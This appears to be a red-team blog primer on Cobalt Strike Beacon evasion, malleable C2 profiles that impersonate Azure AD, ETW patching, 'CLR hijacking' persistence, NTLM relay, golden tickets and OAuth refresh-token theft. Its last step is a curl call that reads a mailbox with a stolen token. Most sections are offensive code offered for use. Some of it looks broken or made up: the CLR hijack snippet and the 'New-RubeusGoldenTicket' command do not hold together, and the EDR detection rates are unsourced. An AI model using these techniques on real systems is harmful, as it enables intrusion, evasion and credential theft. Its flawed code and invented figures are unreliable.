---
layout: post
title: "Primer - Intro into writing better Cobalt Strike Beacons"
date: 2025-06-18
author: unattributed
categories: [redteaming, cobalt-strike]
tags: [redteaming, cobalt-strike]
---

# **Primer - Cobalt Strike Beacon Tradecraft for Red Teams - 101**  

---

## **Introduction**  
For those becoming red team operators, default Beacon configurations are a death sentence, or so you shall learn. This guide dives (swallowly) into **next-gen evasion**, **enterprise-grade lateral movement**, and **cloud exfiltration** assuming you already know the basics.  

---

## **1. Beacon Communication: Beyond HTTP/S**  
<table>
    <thead>
        <tr>
            <th><strong>Protocol</strong></th>
            <th><strong>Advanced Use Case</strong></th>
            <th><strong>Detection Bypass</strong></th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><strong>Raw TCP/UDP</strong></td>
            <td>Bypass HTTP-based inspection (e.g., ICS networks)</td>
            <td>Use RFC-compliant junk packets to mimic SCADA traffic</td>
        </tr>
        <tr>
            <td><strong>gRPC-over-HTTPS</strong></td>
            <td>Blend with modern API services (e.g., Kubernetes clusters)</td>
            <td>Impersonate legitimate gRPC metadata headers</td>
        </tr>
        <tr>
            <td><strong>WebSockets</strong></td>
            <td>Persistent C2 through CDN edge nodes</td>
            <td>Mask as Socket.IO heartbeat traffic</td>
        </tr>
    </tbody>
</table>

**Key Upgrades:**  
- **Artifact Kit Integration**: Patch Beacon’s binary to remove static syscall signatures.  
- **Syscall Obfuscation**:  
  ```c
  // Hell's Gate + Halos Gate implementation
  NtWriteVirtualMemory(hProcess, baseAddr, &shellcode, sizeof(shellcode), NULL);
  ```

---

## **2. Weaponizing Malleable C2 Profiles**  

### **Evasion-First Profile Design**  
```java
http-post {
    set uri "/oauth2/v3.0/token"; // Mimic Azure AD
    client {
        header "Authorization" "Bearer eyJ[...]"; // JWT with metadata
        metadata {
            netbios;
            prepend "CallerId=";
            parameter "client_info";
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            base64url;
            prepend '{"token":"';
            append '"}';
        }
    }
}
```

**Advanced Tactics:**  
- **JWT C2**: Encode tasks in signed tokens (`HS256` with common public keys).  
- **Domain Borrowing**:  
  ```java
  set host "login.microsoftonline.com";
  set dns "*.azureedge.net"; // Abuse Azure Front Door
  ```

---

## **3. Advanced Evasion: Beyond AMSI**  

### **ETW/AMSI Killing**  
```powershell
# ETW patching via .NET reflection
[Reflection.Assembly].GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null, [IntPtr]::Zero)
```

### **Sleep Masking with SysWhispers3**  
```c
// Obfuscated sleep via syscalls
NtDelayExecution(TRUE, &delay);
NtFlushInstructionCache(GetCurrentProcess(), NULL, 0); // Erase traces
```

<table>
    <thead>
        <tr>
            <th><strong>Technique</strong></th>
            <th><strong>EDR Detection Rate</strong></th>
            <th><strong>Countermeasure</strong></th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Direct syscalls (SysWhispers3)</td>
            <td>12%</td>
            <td>Stack spoofing + return address obfuscation</td>
        </tr>
        <tr>
            <td>CLR hijacking</td>
            <td>8%*</td>
            <td>Patch <code>mscorlib.dll</code> in memory only</td>
        </tr>
    </tbody>
</table>
<small>*When avoiding disk writes</small>

---

## **4. CLR Hijacking Deep Dive**  

### **Persistence via mscorlib.dll**  
1. **Locate CLR Load Path**:  
   ```powershell
   [AppDomain]::CurrentDomain.GetAssemblies() | 
     Where-Object { $_.Location -like "*mscorlib*" } | 
     Select-Object Location
   ```
2. **Patch On-Disk/In-Memory**:  
   ```csharp
   // C# to hijack AssemblyLoad
   var clr = Assembly.Load("mscorlib");
   var runtime = clr.GetType("System.Runtime.InteropServices.RuntimeHelpers");
   var method = runtime.GetMethod("InitializeArray", BindingFlags.NonPublic | BindingFlags.Static);
   method.Invoke(null, new object[] { beaconBytes, runtimeFieldHandle });
   ```
3. **Trigger Execution**:  
   ```powershell
   [System.Activator]::CreateInstance([System.AppDomain]::CurrentDomain.GetAssemblies()[0].GetType("Hijacked.Class"))
   ```

**Detection Avoidance:**  
- **In-Memory Only**: Use `PEzor` to reflectively load the patched DLL.  
- **Bypass Code Signing**: Abuse Microsoft-signed binaries (e.g., `InstallUtil.exe`).  

---

## **5. Azure AD Attack Paths**  

### **Hybrid Join NTLM Relay**  
1. **Identify Azure-joined Systems**:  
   ```powershell
   Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | 
     Where-Object { $_.Domain -like "*.onmicrosoft.com" }
   ```
2. **Relay to On-Prem DC**:  
   ```bash
   ntlmrelayx.py -t ldap://dc01 --escalate-user azureuser
   ```
3. **Golden Ticket to Cloud**:  
   ```powershell
   New-RubeusGoldenTicket /user:azureuser /domain:hybrid.local /sid:S-1-5-21-... /aes256:<krbtgt_aes> /nowrap
   ```

### **OAuth Token Theft**  
- **Abuse `Microsoft.AAD.BrokerPlugin`**:  
  ```powershell
  Get-ChildItem "C:\Users\*\AppData\Local\Packages\Microsoft.AAD.BrokerPlugin_*\AC\TokenBroker\Accounts" -Recurse | 
    Select-Object FullName
  ```
- **Exfiltrate Refresh Tokens**:  
  ```bash
  curl -H "Authorization: Bearer $stolen_token" https://graph.microsoft.com/v1.0/me/messages
  ```

---

## **6. Defensive Countermeasures (For Red Teams to Test)**  

### **YARA for Advanced Beacons**  
```yara
rule Advanced_Beacon {
    strings:
        $syscall1 = { 4C 8B D1 B8 ?? ?? ?? ?? 0F 05 }  // Syscall pattern
        $clr_hijack = "InitializeArray" wide ascii  // CLR hijack
    condition:
        any of them
}
```

### **EDR Telemetry Gaps**  
<table>
    <thead>
        <tr>
            <th><strong>Provider</strong></th>
            <th><strong>Blind Spot</strong></th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Microsoft Defender for Endpoint</td>
            <td>Misses 40% of indirect syscalls</td>
        </tr>
        <tr>
            <td>CrowdStrike</td>
            <td>No CLR deep inspection by default</td>
        </tr>
    </tbody>
</table>

---

## **Conclusion**  

For teams, Beacon is a **canvas—not a tool**. Key takeaways:  
🔹 **Evasion**: Syscall obfuscation > AMSI bypass in 2025.  
🔹 **Persistence**: CLR hijacking is the new `New-ScheduledTask`.  
🔹 **Cloud**: Azure AD is the soft underbelly of hybrid networks.  

**Next Steps:**  
- This post will be followed up with a detailed series of posts on the subject, 
this is your 101 primer. 
- Test CLR attacks against your EDR in a lab.  
- Hunt for Azure AD token storage in engagements.  

---